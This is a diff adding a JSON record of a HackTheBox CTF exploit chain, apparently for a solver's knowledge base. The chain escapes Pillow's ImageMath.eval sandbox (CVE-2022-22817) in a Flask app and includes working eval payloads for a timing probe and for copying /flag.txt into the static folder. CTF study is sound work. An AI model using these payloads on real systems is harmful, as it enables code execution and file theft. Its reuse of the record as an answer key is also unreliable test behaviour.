@@ -1,0 +1,110 @@
+{
+  "id": "htb-amidst-us-imagemath-eval-static-folder-exfil",
+  "source_note": "solved/amidst-us.md",
+  "challenge": {
+    "name": "Amidst Us",
+    "platform": "HackTheBox",
+    "event": "Cyber Apocalypse 2022",
+    "category": "web",
+    "solved_at": "2026-09-15",
+    "assistance": "writeup-assisted"
+  },
+  "stack": [
+    "python",
+    "flask",
+    "pillow",
+    "werkzeug"
+  ],
+  "preconditions": {
+    "all_of": [
+      "a server-side image pipeline interpolates a user value into a PIL.ImageMath.eval expression",
+      "Pillow is 8.4.0 or older, so eval/exec remain callable inside ImageMath expressions",
+      "the response can carry back some artifact the pipeline produces"
+    ],
+    "any_of": [
+      "an upload endpoint that accepts arbitrary PIL-openable formats and rejects others as bad image file",
+      "a color or alpha parameter that lands inside a formatted expression string"
+    ]
+  },
+  "signals": [
+    "ImageMath.eval",
+    "make_alpha",
+    "alphafy",
+    "alpha band",
+    "difference1",
+    "difference2",
+    "bad image file",
+    "werkzeug dev server",
+    "image upload",
+    "background color array",
+    "base64 image field",
+    "static folder"
+  ],
+  "chain": [
+    {
+      "step": 1,
+      "stage": "primitive",
+      "action": "accept any PIL-openable image (PNG/GIF confirmed, EPS rejected) and pass one 1x1 RGBA baseline to learn the response contract",
+      "why": "the pipeline runs make_alpha only after Image.open succeeds, so the baseline defines the cheapest valid request"
+    },
+    {
+      "step": 2,
+      "stage": "pivot",
+      "action": "confirm the ImageMath.eval sandbox escape with a time differential: background[0] = eval(\"__import__('time').sleep(6)\") delays the response to ~7.5s instead of ~1s",
+      "why": "Pillow <= 8.4.0 lets eval be called inside an ImageMath expression (CVE-2022-22817); the raw-arithmetic string fails validation, only the eval(...) wrapper survives, so the timing probe is the discriminating one"
+    },
+    {
+      "step": 3,
+      "stage": "exfil",
+      "action": "copy the flag into the app's own static folder: background[0] = eval(\"__import__('shutil').copy('/flag.txt', __import__('flask').current_app.static_folder + '/f.txt')\")",
+      "why": "flask.current_app is available inside the request context, so the app reveals its own static folder instead of guessing paths, and the static route then serves the flag as an HTTP GET"
+    },
+    {
+      "step": 4,
+      "stage": "flag",
+      "action": "GET /static/f.txt and read the flag from the live response, then remove the copied artifact with os.remove(static_folder + '/f.txt')",
+      "why": "the response channel is already reachable, and write-shaped probes on a shared instance must be cleaned up"
+    }
+  ],
+  "first_confirming_probe": {
+    "request": "background[0] = eval(\"__import__('time').sleep(6)\") compared with a ~1s baseline request",
+    "expected": "response time near 7s instead of ~1s",
+    "falsifier": "the response stays at the baseline duration (eval not executed), or every string in background is rejected before the pipeline"
+  },
+  "blast_radius": "arbitrary python runs inside the challenge container; a cp or rm with a wrong path can disturb app state, and an eval(exit()) kills the single-process dev server permanently",
+  "verification": {
+    "status": "verified_live",
+    "evidence": "flag string read from /static/f.txt on the rebuilt deployment",
+    "proof": "response time near 7s instead of ~1s"
+  },
+  "reuse_when": [
+    "a server-side pipeline formats user values into an ImageMath or similar sandboxed expression",
+    "Pillow or another sandbox exposes eval/exec as builtins in the compiled namespace",
+    "the app can write into a folder the same instance serves back over HTTP"
+  ],
+  "known_traps": [
+    "raw arithmetic strings in the injection slot are rejected before execution; the working payload needs the eval(\"...\") wrapper",
+    "a fast 400 can hide a command that already executed as a side effect; verify the write result downstream",
+    "quoted shells inside the f-string need exactly one escaping level per layer or the whole expression never parses",
+    "the static_folder is guessable but not required: flask.current_app hands out the real path from inside the request",
+    "class budget accounting counts the exploratory probes; keep falsifiers separate so the confirmed mechanism keeps a probe slot for the exfil round"
+  ],
+  "flag": null,
+  "schema_version": 1,
+  "classification": {
+    "primary": "web-logic-flaw",
+    "confidence": 0.8
+  },
+  "source": {
+    "url": "local://knowledge/chains/htb-amidst-us-imagemath-eval-static-folder-exfil.json",
+    "retrieved_at": "2026-09-15",
+    "evidence_spans": [
+      "first_confirming_probe: background[0] = eval(\"__import__('time').sleep(6)\") compared with a ~1s baseline request"
+    ]
+  },
+  "quality": {
+    "verified_live": true,
+    "review_status": "raw",
+    "extraction_confidence": 0.8
+  }
+}
